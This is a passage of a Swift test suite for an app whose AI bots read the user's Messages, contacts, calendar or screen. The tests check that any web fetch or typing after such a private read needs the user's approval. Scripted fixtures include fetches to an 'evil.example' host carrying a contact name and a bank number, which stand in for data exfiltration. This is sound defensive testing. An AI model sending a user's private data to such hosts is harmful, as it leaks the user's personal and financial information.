    func grantedConnectorNames(teammateID: TeammateID) async -> Set<String> {
        granted.contains(teammateID) ? [Self.serverName] : []
    }
    func connectorAccess(teammateID: TeammateID, runID: UUID) async -> ClaudeTextConnectorAccess? {
        guard granted.contains(teammateID) else { return nil }
        // A fresh profile per run, exactly as the real resolution does.
        let profile = URL(fileURLWithPath: "/private/tmp/openbots-browser.noindex/\(runID.uuidString.lowercased())")
        return try? ClaudeTextConnectorAccess(servers: [
            try ClaudeTextConnectorServer(
                name: Self.serverName, role: .browser,
                executableURL: URL(fileURLWithPath: "/opt/homebrew/bin/node"),
                entryPointURL: URL(fileURLWithPath: "/private/tmp/cache.noindex/chrome-devtools-mcp.js"),
                options: [.headless, .userDataDirectory(profile),
                          .executablePath(URL(fileURLWithPath: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"))],
                environment: ["CHROME_DEVTOOLS_MCP_NO_USAGE_STATISTICS": "1"])
        ])
    }

    func revoke() { granted = []; for observer in observers.values { observer.yield(()) } }
    private func forget(_ id: UUID) { observers[id] = nil }
}

/// A resolver that grants the app's Messages server with a list of chats, and
/// can change the list while a turn runs.
private actor MessagesChatsAccess: ClaudeTextReplyWebAccessResolving {
    private let teammateID: TeammateID
    private var chats: AppleMessagesChatScope
    private var observers: [UUID: AsyncStream<Void>.Continuation] = [:]
    static let serverName = "openbots_" + String(repeating: "4d657373", count: 8)

    private let web: Set<ClaudeTextOnlyTool>
    private let withMac: Bool
    private let withMessages: Bool
    private let withChrome: Bool
    /// Other connectors that read something private of the user's.
    private let readers: [ClaudeTextConnectorRole]
    static func readerServerName(_ role: ClaudeTextConnectorRole) -> String {
        let index = ClaudeTextConnectorRole.allCases.firstIndex(of: role) ?? 0
        return "openbots_" + String(repeating: String(format: "%08x", 0x72656100 + index), count: 8)
    }
    static let macServerName = "openbots_" + String(repeating: "6d616321", count: 8)
    static let chromeServerName = "openbots_" + String(repeating: "6368726f", count: 8)

    init(teammateID: TeammateID, chats: [String], web: Set<ClaudeTextOnlyTool> = [], withMac: Bool = false,
         withMessages: Bool = true, withChrome: Bool = false, readers: [ClaudeTextConnectorRole] = []) {
        self.teammateID = teammateID; self.chats = AppleMessagesChatScope(guids: chats); self.web = web
        self.withMac = withMac; self.withMessages = withMessages; self.withChrome = withChrome
        self.readers = readers
    }

    func allowedTextReplyTools(teammateID: TeammateID) async -> Set<ClaudeTextOnlyTool> {
        teammateID == self.teammateID ? web : []
    }
    func webAccessChanges() async -> AsyncStream<Void> {
        AsyncStream(bufferingPolicy: .bufferingNewest(1)) { continuation in
            let id = UUID()
            observers[id] = continuation
            continuation.onTermination = { _ in Task { await self.forget(id) } }
        }
    }
    func grantedConnectorNames(teammateID: TeammateID) async -> Set<String> {
        teammateID == self.teammateID ? Set((withMessages ? [Self.serverName] : []) + (withMac ? [Self.macServerName] : [])
            + (withChrome ? [Self.chromeServerName] : []) + readers.map(Self.readerServerName)) : []
    }
    func messagesChats(teammateID: TeammateID) async -> AppleMessagesChatScope {
        teammateID == self.teammateID ? chats : .init(guids: [])
    }
    func connectorAccess(teammateID: TeammateID, runID: UUID) async -> ClaudeTextConnectorAccess? {
        guard teammateID == self.teammateID else { return nil }
        return try? ClaudeTextConnectorAccess(servers: (withMessages ? [
            try ClaudeTextConnectorServer(
                name: Self.serverName, role: .appleMessages,
                executableURL: URL(fileURLWithPath: "/opt/homebrew/bin/node"),
                entryPointURL: URL(fileURLWithPath: "/private/tmp/apple-messages.js"), options: [],
                environment: [AppleMessagesChatScope.environmentKey: chats.environmentValue], chatScope: chats)
        ] : []) + (withMac ? [ClaudeTextConnectorServer(name: Self.macServerName, role: .macControl,
                program: .installedTool(URL(fileURLWithPath: "/private/tmp/openbots-peekaboo-fixture")),
                options: [], environment: [:])] : [])
            + (withChrome ? [ClaudeTextConnectorServer(name: Self.chromeServerName, role: .chromeControl,
                executableURL: URL(fileURLWithPath: "/opt/homebrew/bin/node"),
                entryPointURL: URL(fileURLWithPath: "/private/tmp/chrome-control/server/index.js"), options: [],
                environment: ["PATH": ClaudeTextConnectorServer.systemSearchPath])] : [])
            + readers.map { role in try ClaudeTextConnectorServer(name: Self.readerServerName(role), role: role,
                executableURL: URL(fileURLWithPath: "/opt/homebrew/bin/node"),
                entryPointURL: URL(fileURLWithPath: "/private/tmp/\(role.rawValue).js"), options: [], environment: [:]) })
    }

    func name(_ guids: [String]) {
        chats = AppleMessagesChatScope(guids: guids)
        for observer in observers.values { observer.yield(()) }
    }
    private func forget(_ id: UUID) { observers[id] = nil }
}

// Every private read closes the web for the session, not only the user's texts and
// the user's Chrome.
@Suite("After a bot reads anything private of the user's, every web search and fetch in that session asks the user")
struct PrivateReadThenWebTests {
    static let readers: Set<ClaudeTextConnectorRole> = [.appleMailRead, .appleContactsRead, .appleCalendarRead,
        .googleGmailReadDraft, .googleCalendarRead, .googleDriveRead, .appleNotes, .appleMessages, .chromeControl,
        .macControl]

    @Test("Every connector role is classified: the ones that read something of the user's, and the rest")
    func everyRoleIsClassified() {
        for role in ClaudeTextConnectorRole.allCases {
            #expect(role.readsPrivately == Self.readers.contains(role), "\(role)")
            if role.readsPrivately { #expect(role.privateReadNoun.hasPrefix("your "), "\(role)") }
        }
        #expect(ClaudeTextConnectorRole.appleContactsRead.privateReadNoun == "your contacts")
    }

    @Test("The CLI is not told to run web tools unasked beside any connector that reads something of the user's")
    func webIsNotPreApprovedBesideAnyReader() async throws {
        for role in Self.readers.subtracting([.appleMessages, .chromeControl, .macControl]).sorted(by: { $0.rawValue < $1.rawValue }) {
            let f = try WebGrantFixture()
            defer { f.remove() }
            let store = try f.open()
            try await f.seed(store)
            let runner = TextsThenWebRunner(calls: [])
            let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch, .webSearch],
                                             withMessages: false, readers: [role])
            let service = f.service(store, runner: runner, access: access, target: try f.target())
            #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
            let request = try #require(await runner.requests.first)
            #expect(request.asksBeforeWeb && request.preApprovedToolNames.isEmpty, "\(role)")
            #expect(!ClaudeTextOnlyCommandBuilder.settingsJSON(for: request).contains("\"WebFetch\""), "\(role)")
        }
    }

    @Test("A fetch before the read goes through; after a Contacts read each one asks, in the words of what was read, for the whole session")
    func aContactsReadFencesTheWebForTheSession() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch], withMessages: false,
                                         readers: [.appleContactsRead])
        let first = TextsThenWebRunner(calls: [
            ("WebFetch", ["url": "https://example.com/a", "prompt": "summary"]),
            ("role:appleContactsRead:search_contacts", ["query": "Charles"]),
            ("WebFetch", ["url": "https://evil.example/?q=charles", "prompt": "summary"]),
        ])
        let service = f.service(store, runner: first, access: access, target: try f.target(), sessions: store)
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        #expect(await first.waitForAnswer("req-1")?.contains("\"behavior\":\"allow\"") == true)
        #expect(await first.waitForAnswer("req-2")?.contains("\"behavior\":\"allow\"") == true)
        let fetch = try #require(await progress.waitForApproval())
        #expect(fetch.detail.contains("https://evil.example/?q=charles") && fetch.detail.contains("read your contacts"),
                "\(fetch.detail)")
        #expect(!fetch.detail.contains("texts") && fetch.turnScopeFolder == nil, "\(fetch.detail)")
        #expect(await service.decideApproval(id: fetch.id, allow: false))
        #expect(await turn.value.outcome == .completed)
        let stored = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(stored.readPrivate == ClaudeTextConnectorRole.appleContactsRead.rawValue && stored.readTexts != true)
        // The next reply continues that session: its fetch asks, before any read.
        let second = TextsThenWebRunner(calls: [("WebFetch", ["url": "https://example.com/b", "prompt": "summary"])])
        let resumed = f.service(store, runner: second, access: access, target: try f.target(),
                                sessions: store, transcripts: [stored.sessionID])
        let progress2 = TextsThenWebProgress()
        let turn2 = Task { await resumed.sendText(f.submission()) { await progress2.append($0) } }
        let asked = try #require(await progress2.waitForApproval(), "a fetch in a session that read the user's contacts must ask")
        #expect(asked.detail.contains("read your contacts"), "\(asked.detail)")
        #expect(await resumed.decideApproval(id: asked.id, allow: false))
        #expect(await turn2.value.outcome == .completed)
        #expect(await second.requests.last?.asksBeforeWeb == true)
        let lines = await progress2.activities
        #expect(lines.contains { $0.contains("read your contacts earlier") }, "\(lines)")
    }

    // A correction starts a new session,
    // and the words it continues from are still there.
    @Test("A correction to a reply that read the user's contacts keeps the fence: its fetch asks")
    func aCorrectionKeepsTheFence() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch], withMessages: false,
                                         readers: [.appleContactsRead])
        let runner = TextsThenWebRunner(calls: [
            ("role:appleContactsRead:search_contacts", ["query": "Charles"]),
            ("WebFetch", ["url": "https://example.com/a", "prompt": "summary"]),
        ], then: [[("WebFetch", ["url": "https://example.com/b", "prompt": "summary"])]])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        _ = try #require(await progress.waitForApproval())
        turn.cancel()
        let stoppedOutcome = await turn.value.outcome
        #expect(stoppedOutcome == .stopped, "\(stoppedOutcome)")
        let corrector = service
        let correction = ClaudeTextTurnSubmission(conversationID: f.conversationID, teammateID: f.teammateID,
            userMessageID: MessageID(UUID()), text: "Only the first one.", correctsRunningTurn: true)
        let progress2 = TextsThenWebProgress()
        let turn2 = Task { await corrector.sendText(correction) { await progress2.append($0) } }
        let asked = try #require(await progress2.waitForApproval(), "a correction's fetch must ask after the stopped reply's read")
        #expect(asked.detail.contains("read your contacts"), "\(asked.detail)")
        #expect(await corrector.decideApproval(id: asked.id, allow: false))
        #expect(await turn2.value.outcome == .completed)
        #expect(await runner.requests.last?.asksBeforeWeb == true)
    }

    // The card must not cut typing at 400 characters.
    @Test("After a private read, typing too long to show whole on the card is refused; shorter typing asks with every word")
    func longTypingAfterAReadIsRefused() {
        func decide(_ text: String, fenced: Bool) -> ClaudeTextWorkDecision {
            let input = try! JSONSerialization.data(withJSONObject: ["text": text, "pid": 999])
            let request = ClaudeTextPermissionRequest(requestID: "r", toolUseID: "t", toolName: "mcp__x__type", inputJSON: input)
            return ClaudeTextMacControlApprovalPolicy.decide(request, botName: "Kite", afterOther: fenced ? "your Mail" : nil)
        }
        let long = String(repeating: "a", count: 401)
        guard case .denyQuietly(let reason, _) = decide(long, fenced: true) else { Issue.record("long typing was not refused"); return }
        #expect(reason.contains("every word"))
        guard case .ask(let card) = decide(String(repeating: "a", count: 400), fenced: true) else { Issue.record("400 must ask"); return }
        #expect(card.words == String(repeating: "a", count: 400))
        guard case .ask = decide(long, fenced: false) else { Issue.record("unfenced long typing still asks"); return }
    }

    // A saved reader this build cannot name must not fail open.
    @Test("A kept session whose saved reader is a role this build does not know stays fenced")
    func anUnknownSavedReaderStaysFenced() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch], withMessages: false)
        let runner = TextsThenWebRunner(calls: [])
        let first = f.service(store, runner: runner, access: access, target: try f.target(), sessions: store)
        #expect(await first.sendText(f.submission()) { _ in }.outcome == .completed)
        let stored = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(await runner.requests.last?.asksBeforeWeb == false)
        try await store.storeClaudeSession(StoredClaudeSession(sessionID: stored.sessionID, startedAt: stored.startedAt,
            lastUsedAt: stored.lastUsedAt, systemPromptDigest: stored.systemPromptDigest, lastSequence: stored.lastSequence,
            leftOutMessages: stored.leftOutMessages, readPrivate: "aRoleFromALaterVersion"),
            conversationID: f.conversationID, teammateID: f.teammateID)
        let resumed = f.service(store, runner: runner, access: access, target: try f.target(),
                                sessions: store, transcripts: [stored.sessionID])
        #expect(await resumed.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.last)
        #expect(request.resumesSession && request.asksBeforeWeb)
        // The fence is kept with the session, so the reply after it is fenced too.
        let kept = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(kept.sessionID == stored.sessionID && kept.readPrivate == "aRoleFromALaterVersion", "\(String(describing: kept.readPrivate))")
        let third = f.service(store, runner: runner, access: access, target: try f.target(),
                              sessions: store, transcripts: [stored.sessionID])
        #expect(await third.sendText(f.submission()) { _ in }.outcome == .completed)
        #expect(await runner.requests.last?.asksBeforeWeb == true)
    }

    // A look at the user's screen is a private read (and the card shows the
    // screenshot as well).
    @Test("A Control this Mac call is a look when its result brings the user's screen back; acting on an app is not")
    func whatCountsAsALook() {
        func look(_ tool: String, _ input: [String: Any] = [:]) -> Bool {
            ClaudeTextMacControlApprovalPolicy.bringsTheScreenBack(tool, input)
        }
        #expect(look("see") && look("inspect_ui") && look("click", ["query": "New Document"]))
        #expect(look("verify_state", ["predicates": []]))
        for tool in ["app", "window", "menu", "dock", "space", "dialog"] {
            #expect(look(tool, ["action": "list"]), "\(tool) list")
            #expect(!look(tool, ["action": "launch"]), "\(tool) launch")
        }
        for tool in ["type", "press", "sleep", "permissions", "move", "scroll", "drag", "set_value", "action"] {
            #expect(!look(tool), "\(tool)")
        }
    }

    // A chain's reads must not merge first-come: a look written first would
    // hide a Contacts read after it, and the next bot's Mac would keep its
    // allowance.
    @Test("In a chain's reads, any real read outranks a look, and names who read it")
    func aRealReadOutranksALookInAChain() {
        let lead = TeammateID(UUID()), member = TeammateID(UUID())
        var chain = OfficialClaudeTextReplyService.PrivateReads(other: .macControl, readerID: lead, readerName: "Lead")
        chain.add(OfficialClaudeTextReplyService.PrivateReads(other: .appleContactsRead, readerID: member, readerName: "Member"))
        #expect(chain.other == .appleContactsRead && chain.readerName == "Member" && chain.noun == "your contacts")
        // And a later look never takes a real read's place.
        chain.add(OfficialClaudeTextReplyService.PrivateReads(other: .macControl, readerID: lead, readerName: "Lead"))
        #expect(chain.other == .appleContactsRead && chain.readerName == "Member")
    }

    @Test("A Control this Mac turn launches with the web left to ask")
    func aMacTurnLaunchesWithTheWebLeftToAsk() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch, .webSearch], withMac: true,
                                         withMessages: false)
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.asksBeforeWeb && request.preApprovedToolNames.isEmpty)
        #expect(!ClaudeTextOnlyCommandBuilder.settingsJSON(for: request).contains("\"WebFetch\""))
    }

    @Test("After a look at the user's screen each fetch asks, shows that screenshot from memory only, and the Mac keeps its allowance")
    func aLookFencesTheWebAndTheCardShowsIt() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let picture = Data("PNG-SCREEN-MARKER-7731".utf8)
        let runner = TextsThenWebRunner(calls: [
            ("mac:app", ["action": "launch", "name": "TextEdit"]),
            ("WebFetch", ["url": "https://example.com/a", "prompt": "summary"]),
            ("mac:see", ["app_target": "TextEdit"]),
            ("mac:press", ["keys": ["tab"], "pid": 999]),
            ("WebFetch", ["url": "https://evil.example/?q=iban", "prompt": "summary"]),
        ], pictures: [3: picture])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch], withMac: true,
                                         withMessages: false)
        // The approvals rows and the record are written, so the test can read them for the picture.
        let service = OfficialClaudeTextReplyService(repository: store, teammates: store, conversations: store,
            messages: store, preparer: WebGrantPreparer(target: try f.target()), runner: runner,
            appOwnerID: f.appOwner, webAccess: access, approvals: store, activity: store, sessions: store,
            resumesSessions: true, sessionTranscriptExists: { _, _ in false },
            sessionTranscriptRemove: { _, _ in ClaudeSessionTranscriptRemoval(removedPaths: [], droppedHistoryLines: 0) })
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        // Opening an app brings nothing of the user's screen back: the fetch after
        // it goes through.
        let launch = try #require(await progress.waitForApproval())
        #expect(await service.allowApprovalForTurn(id: launch.id))
        #expect(await runner.waitForAnswer("req-2")?.contains("\"behavior\":\"allow\"") == true)
        // The look and the key press after it ride the turn's allowance: a look does not fence the Mac itself.
        #expect(await runner.waitForAnswer("req-3")?.contains("\"behavior\":\"allow\"") == true)
        #expect(await runner.waitForAnswer("req-4")?.contains("\"behavior\":\"allow\"") == true)
        var fetch: ClaudeTextApproval?
        for _ in 0..<800 {
            fetch = await progress.approvals.dropFirst().first
            if fetch != nil { break }
            try? await Task.sleep(for: .milliseconds(10))
        }
        let card = try #require(fetch, "a fetch after a look at the user's screen must ask")
        #expect(card.toolName == "WebFetch" && card.detail.contains("your screen"), "\(card.detail)")
        #expect(card.screenPicture == picture)
        #expect(await service.decideApproval(id: card.id, allow: false))
        #expect(await turn.value.outcome == .completed)
        // The picture is shown, never kept: no row, no record line, no byte of the database holds it.
        let rows = try await store.approvals(conversationID: f.conversationID, limit: 20)
        #expect(!rows.isEmpty)
        let dump = rows.map { "\($0)" }.joined() + (try await store.runActivity(conversationID: f.conversationID, limit: 100)
            .map(\.line).joined())
        #expect(!dump.contains("PNG-SCREEN-MARKER-7731"))
        let files = (FileManager.default.enumerator(at: f.directory, includingPropertiesForKeys: nil)?.allObjects ?? [])
            .compactMap { $0 as? URL }
        #expect(files.contains { $0.lastPathComponent.hasSuffix(".sqlite") || $0.lastPathComponent.contains("sqlite") }, "\(files)")
        for file in files {
            if let bytes = try? Data(contentsOf: file) {
                #expect(bytes.range(of: picture) == nil, "\(file.lastPathComponent)")
            }
        }
        // The session remembers the look: the next reply's fetch asks, with no picture to show.
        let stored = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(stored.readPrivate == ClaudeTextConnectorRole.macControl.rawValue)
        let second = TextsThenWebRunner(calls: [("WebFetch", ["url": "https://example.com/b", "prompt": "summary"])])
        let resumed = f.service(store, runner: second, access: access, target: try f.target(),
                                sessions: store, transcripts: [stored.sessionID])
        let progress2 = TextsThenWebProgress()
        let turn2 = Task { await resumed.sendText(f.submission()) { await progress2.append($0) } }
        let asked = try #require(await progress2.waitForApproval(), "a fetch in a session that looked at the user's screen must ask")
        #expect(asked.detail.contains("your screen") && asked.screenPicture == nil, "\(asked.detail)")
        #expect(await resumed.decideApproval(id: asked.id, allow: false))
        #expect(await turn2.value.outcome == .completed)
    }

    @Test("After a look at the user's screen, typing and a dialog's input ask every time while a key like Tab rides the allowance, in a kept session too")
    func typingAfterALookAsksEveryTime() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [
            ("mac:app", ["action": "launch", "name": "TextEdit"]),
            ("mac:type", ["text": "before a look", "app": "TextEdit"]),
            ("mac:see", ["app_target": "TextEdit"]),
            ("mac:press", ["keys": ["tab"], "pid": 999]),
            ("mac:type", ["text": "FR76 3000", "app": "Safari"]),
            ("mac:dialog", ["action": "input", "text": "FR76 3000", "app": "TextEdit"]),
        ])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [], withMac: true, withMessages: false)
        let service = f.service(store, runner: runner, access: access, target: try f.target(), sessions: store)
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        let launch = try #require(await progress.waitForApproval())
        #expect(await service.allowApprovalForTurn(id: launch.id))
        // Before any look, typing rides the allowance as before; so do the look and a Tab after it.
        for id in ["req-2", "req-3", "req-4"] {
            #expect(await runner.waitForAnswer(id)?.contains("\"behavior\":\"allow\"") == true, "\(id)")
        }
        func nextCard(after count: Int) async -> ClaudeTextApproval? {
            for _ in 0..<800 {
                let all = await progress.approvals
                if all.count > count { return all[count] }
                try? await Task.sleep(for: .milliseconds(10))
            }
            return nil
        }
        let typed = try #require(await nextCard(after: 1), "typing after a look must ask")
        #expect(typed.turnScopeFolder == nil && typed.detail.contains("looked at your screen"), "\(typed.detail)")
        #expect(await service.decideApproval(id: typed.id, allow: true))
        // cmd+v is judged at the policy (MacControlTypingAfterALookTests): this
        // process's keyboard layout refuses a pressed letter before any card.
        let pastedCard = await nextCard(after: 2)
        let pasteAnswer = await runner.answers["req-6"]
        let pasted = try #require(pastedCard, "a dialog's input after a look must ask: \(String(describing: pasteAnswer))")
        #expect(pasted.turnScopeFolder == nil, "\(pasted.detail)")
        #expect(await service.decideApproval(id: pasted.id, allow: false))
        #expect(await turn.value.outcome == .completed)
        // The next reply in the same session remembers the look: its typing asks even under a fresh allowance.
        let stored = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        let second = TextsThenWebRunner(calls: [
            ("mac:app", ["action": "launch", "name": "TextEdit"]),
            ("mac:type", ["text": "FR76 3000", "app": "Safari"]),
        ])
        let resumed = f.service(store, runner: second, access: access, target: try f.target(),
                                sessions: store, transcripts: [stored.sessionID])
        let progress2 = TextsThenWebProgress()
        let turn2 = Task { await resumed.sendText(f.submission()) { await progress2.append($0) } }
        let launch2 = try #require(await progress2.waitForApproval())
        #expect(await resumed.allowApprovalForTurn(id: launch2.id))
        var asked: ClaudeTextApproval?
        for _ in 0..<800 {
            asked = await progress2.approvals.dropFirst().first
            if asked != nil { break }
            try? await Task.sleep(for: .milliseconds(10))
        }
        let card = try #require(asked, "typing in a session that looked at the user's screen must ask")
        #expect(card.detail.contains("looked at your screen"), "\(card.detail)")
        #expect(await resumed.decideApproval(id: card.id, allow: false))
        #expect(await turn2.value.outcome == .completed)
    }

    @Test("Once the user's calendar was read, Control this Mac asks for every call and says why")
    func macAsksAfterACalendarRead() {
        let request = ClaudeTextPermissionRequest(requestID: "r", toolUseID: "t", toolName: "mcp__x__press",
            inputJSON: Data(#"{"keys":["tab"],"pid":999}"#.utf8))
        let decision = ClaudeTextMacControlApprovalPolicy.decide(request, botName: "Kite", afterOther: "your calendar")
        guard case .ask(let card) = decision else { Issue.record("\(decision)"); return }
        #expect(!card.offersTurnAllowance && card.detail.contains("read your calendar earlier"), "\(card.detail)")
    }
}

@Suite("The chats a bot may read in Messages, changed while it answers")
struct MessagesChatsWhileATurnRunsTests {
    @Test("A chat taken out while the bot answers stops the turn, as a removed folder does")
    func aChatTakenOutStopsTheTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = HeldWebGrantRunner()
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: ["any;-;+33612345678", "any;-;Carrier Info"])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        await access.name(["any;-;Carrier Info"])
        #expect(await outcome == .stopped)
        #expect(await runner.wasCancelled)
    }

    @Test("A chat added while the bot answers waits for the next turn and stops nothing")
    func aChatAddedWaits() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = HeldWebGrantRunner()
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: ["any;-;+33612345678"])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        await access.name(["any;-;+33612345678", "any;-;Carrier Info"])
        #expect(await outcome == .completed)
        #expect(await !runner.wasCancelled)
        #expect(await runner.requests.first?.connectorAccess?.servers.first?.chatScope
                == AppleMessagesChatScope(guids: ["any;-;+33612345678"]))
    }
}

@Suite("Browser grants reaching an ordinary text turn")
struct ClaudeTextConnectorTurnTests {
    @Test("A bot granted only a browser gets one, with no files, no shell and no web")
    func aBrowserAloneIsEnough() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = WebGrantRunner()
        let access = BrowserGrantAccess(granted: [f.teammateID])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.grantsConnectors)
        #expect(!request.grantsWork)
        #expect(request.allowedTools.isEmpty)
        #expect(request.connectorAccess?.servers.map(\.name) == [BrowserGrantAccess.serverName])
        // The command asks the host, drops safe mode, and names no file, shell
        // or web built-in — only the question tool, which is how it puts a
        // choice to the user instead of typing one into the chat.
        let arguments = ClaudeTextOnlyCommandBuilder.arguments(for: request)
        #expect(arguments.contains("--permission-prompt-tool"))
        #expect(!arguments.contains("--safe-mode"))
        #expect(!arguments.contains("--add-dir"))
        #expect(arguments[arguments.firstIndex(of: "--tools")! + 1]
            == ClaudeTextOnlyRequest.questionToolName)
    }

    @Test("A bot without the grant is byte-for-byte the shipped turn")
    func withoutTheGrantNothingChanges() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = WebGrantRunner()
        let service = f.service(store, runner: runner, access: BrowserGrantAccess(granted: []),
                                target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.connectorAccess == nil)
        #expect(ClaudeTextOnlyCommandBuilder.arguments(for: request) == f.shippedArguments(request))
    }

    @Test("Taking the browser away mid-answer stops the turn, and reports it as stopped")
    func revokingTheBrowserStopsTheTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = HeldWebGrantRunner()
        let access = BrowserGrantAccess(granted: [f.teammateID])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        async let outcome = service.sendText(f.submission()) { _ in }.outcome
        await runner.waitUntilRunning()
        await access.revoke()
        // Stopped, not failed: the user took something away, nothing broke.
        #expect(await outcome == .stopped)
    }

    @Test("Each bot's own browser grant applies to its own leg of a team turn")
    func theGrantIsPerBot() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = WebGrantRunner()
        // A different teammate holds the grant, so this bot must not inherit it.
        let service = f.service(store, runner: runner,
                                access: BrowserGrantAccess(granted: [TeammateID(UUID())]),
                                target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.connectorAccess == nil)
        #expect(!request.grantsConnectors)
    }
}


/// A Messages turn with the web: fetch, read the user's texts, fetch, search, each
/// asked in turn and answered by the app.
private actor TextsThenWebRunner: ClaudeTextOnlyRunning {
    private(set) var requests: [ClaudeTextOnlyRequest] = []
    private(set) var answers: [String: String] = [:]
    private var calls: [(tool: String, input: [String: Any])]
    /// The calls of each later run, in order; a run past them repeats the last.
    private var later: [[(tool: String, input: [String: Any])]]
    /// The picture a call hands back once allowed, by its place in the run
    /// (from one), as Peekaboo's `see` does.
    private let pictures: [Int: Data]

    init(calls: [(tool: String, input: [String: Any])], then later: [[(tool: String, input: [String: Any])]] = [],
         pictures: [Int: Data] = [:]) {
        self.calls = calls; self.later = later; self.pictures = pictures
    }

    func waitForAnswer(_ requestID: String) async -> String? {
        for _ in 0..<800 {
            if let answer = answers[requestID] { return answer }
            try? await Task.sleep(for: .milliseconds(10))
        }
        return nil
    }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await run(request: request, control: nil, onEvent: onEvent)
    }

    func run(request: ClaudeTextOnlyRequest, control: ClaudeTextTurnControl?,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        if !requests.isEmpty, !later.isEmpty { calls = later.removeFirst() }
        requests.append(request)
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        let messages = request.connectorAccess?.servers.first { $0.role == .appleMessages }?.toolNamespace ?? "mcp__none__"
        let mac = request.connectorAccess?.servers.first { $0.role == .macControl }?.toolNamespace ?? "mcp__none__"
        let chrome = request.connectorAccess?.servers.first { $0.role == .chromeControl }?.toolNamespace ?? "mcp__none__"
        if let control {
            for (index, call) in calls.enumerated() {
                // "role:<role>:<tool>" names a tool of any other connector the turn carries.
                let parts = call.tool.split(separator: ":", maxSplits: 2).map(String.init)
                let name: String
                if parts.count == 3, parts[0] == "role", let role = ClaudeTextConnectorRole(rawValue: parts[1]) {
                    name = (request.connectorAccess?.servers.first { $0.role == role }?.toolNamespace ?? "mcp__none__") + parts[2]
                } else {
                    name = call.tool.hasPrefix("WebS") || call.tool.hasPrefix("WebF") ? call.tool
                        : call.tool.hasPrefix("mac:") ? mac + call.tool.dropFirst(4)
                        : call.tool.hasPrefix("chrome:") ? chrome + call.tool.dropFirst(7) : messages + call.tool
                }
                let data = (try? JSONSerialization.data(withJSONObject: call.input, options: [.sortedKeys])) ?? Data()
                let id = "req-\(index + 1)"
                await onEvent(.toolUse(ClaudeTextToolUse(id: "toolu_\(index + 1)", toolName: name, inputJSON: data)))
                let asked = ClaudeTextPermissionRequest(requestID: id, toolUseID: "toolu_\(index + 1)", toolName: name, inputJSON: data)
                control.register(asked)
                await onEvent(.permissionRequested(asked))
                var allowed = false
                for _ in 0..<800 {
                    if let answer = control.takePending().first.map({ String(decoding: $0, as: UTF8.self) }) {
